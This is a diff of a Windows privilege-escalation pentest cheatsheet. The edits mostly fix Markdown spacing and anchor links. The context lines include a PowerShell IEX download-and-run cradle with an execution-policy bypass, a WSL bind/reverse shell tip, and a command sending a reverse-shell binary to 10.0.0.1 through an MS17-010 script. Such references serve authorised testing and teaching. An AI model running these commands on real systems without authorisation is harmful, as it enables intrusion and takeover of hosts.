@@ -58,9 +58,9 @@
 * [EoP - Privileged File Delete](#eop---privileged-file-delete)
 * [EoP - Common Vulnerabilities and Exposures](#eop---common-vulnerabilities-and-exposure)
     * [MS08-067 (NetAPI)](#ms08-067-netapi)
-    * [MS10-015 (KiTrap0D)](#ms10-015-kitrap0d---microsoft-windows-nt2000--2003--2008--xp--vista--7)
-    * [MS11-080 (adf.sys)](#ms11-080-afd.sys---microsoft-windows-xp-2003)
-    * [MS15-051 (Client Copy Image)](#ms15-051---microsoft-windows-2003--2008--7--8--2012)
+    * [MS10-015 (KiTrap0D)](#ms10-015-kitrap0d---microsoft-windows-nt200020032008xpvista7)
+    * [MS11-080 (adf.sys)](#ms11-080-afdsys---microsoft-windows-xp2003)
+    * [MS15-051 (Client Copy Image)](#ms15-051-client-copy-image---microsoft-windows-20032008782012)
     * [MS16-032](#ms16-032---microsoft-windows-7--10--2008--2012-r2-x86x64)
     * [MS17-010 (Eternal Blue)](#ms17-010-eternal-blue)
     * [CVE-2019-1388](#cve-2019-1388)
@@ -74,12 +74,14 @@
     ```powershell
     powershell -Version 2 -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks
     ```
+
 * [Watson - Watson is a (.NET 2.0 compliant) C# implementation of Sherlock](https://github.com/rasta-mouse/Watson)
 * [(Deprecated) Sherlock - PowerShell script to quickly find missing software patches for local privilege escalation vulnerabilities](https://github.com/rasta-mouse/Sherlock)
 
     ```powershell
     powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File Sherlock.ps1
     ```
+
 * [BeRoot - Privilege Escalation Project - Windows / Linux / Mac](https://github.com/AlessandroZ/BeRoot)
 * [Windows-Exploit-Suggester](https://github.com/GDSSecurity/Windows-Exploit-Suggester)
 
@@ -87,6 +89,7 @@
     ./windows-exploit-suggester.py --update
     ./windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo win7sp1-systeminfo.txt 
     ```
+
 * [windows-privesc-check - Standalone Executable to Check for Simple Privilege Escalation Vectors on Windows Systems](https://github.com/pentestmonkey/windows-privesc-check)
 * [WindowsExploits - Windows exploits, mostly precompiled. Not being updated.](https://github.com/abatchy17/WindowsExploits)
 * [WindowsEnum - A Powershell Privilege Escalation Enumeration Script.](https://github.com/absolomb/WindowsEnum)
@@ -97,12 +100,14 @@
     Seatbelt.exe -group=system -outputfile="C:\Temp\system.txt"
     Seatbelt.exe -group=remote -computername=dc.theshire.local -computername=192.168.230.209 -username=THESHIRE\sam -password="yum \"po-ta-toes\""
     ```
+
 * [Powerless - Windows privilege escalation (enumeration) script designed with OSCP labs (legacy Windows) in mind](https://github.com/M4ximuss/Powerless)
 * [JAWS - Just Another Windows (Enum) Script](https://github.com/411Hall/JAWS)
 
     ```powershell
     powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt
     ```
+
 * [winPEAS - Windows Privilege Escalation Awesome Script](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe)
 * [Windows Exploit Suggester - Next Generation (WES-NG)](https://github.com/bitsadmin/wesng)
 
@@ -115,6 +120,7 @@
     python3 wes.py --update
     python3 wes.py systeminfo.txt
     ```
+
 * [PrivescCheck - Privilege Escalation Enumeration Script for Windows](https://github.com/itm4n/PrivescCheck)
 
     ```powershell
@@ -622,6 +628,7 @@ PS > Get-Content -path flag.txt -Stream Flag
 > A service running as Administrator/SYSTEM with incorrect file permissions might allow EoP. You can replace the binary, restart the service and get system.
 
 Often, services are pointing to writable locations:
+
 * Orphaned installs, not installed anymore but still exist in startup
 * DLL Hijacking
 
@@ -745,9 +752,7 @@ $ sc start <vuln-service>
 
 ## EoP - Windows Subsystem for Linux (WSL)
 
-Technique borrowed from [Warlockobama's tweet](https://twitter.com/Warlockobama/status/1067890915753132032)
-
-> With root privileges Windows  Subsystem for Linux (WSL)  allows users to create a bind shell on any port (no elevation needed). Don't know the root password? No problem just set the default user to root W/ <distro>.exe --default-user root. Now start your bind shell or reverse.
+> With root privileges Windows  Subsystem for Linux (WSL)  allows users to create a bind shell on any port (no elevation needed). Don't know the root password? No problem just set the default user to root W/ `<distro>.exe --default-user root`. Now start your bind shell or reverse. - [Warlockobama's tweet](https://twitter.com/Warlockobama/status/1067890915753132032)
 
 ```powershell
 wsl whoami
@@ -794,12 +799,14 @@ gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Whe
 ### Example
 
 For `C:\Program Files\something\legit.exe`, Windows will try the following paths first:
+
 * `C:\Program.exe`
 * `C:\Program Files.exe`
 
 ## EoP - $PATH Interception
 
 Requirements:
+
 * PATH contains a writable folder with low privileges.
 * The writable folder is _before_ the folder that contains the legitimate binary.
 
@@ -1496,10 +1503,12 @@ python2 send_and_execute.py 10.0.0.1 revshell.exe
 Exploit : [packetstormsecurity/hhupd.exe](https://packetstormsecurity.com/files/14437/hhupd.exe.html)
 
 Requirement:
+
 * Windows 7
 * Windows 10 LTSC 10240
 
 Failing on :
+
 * LTSC 2019
 * 1709
 * 1803
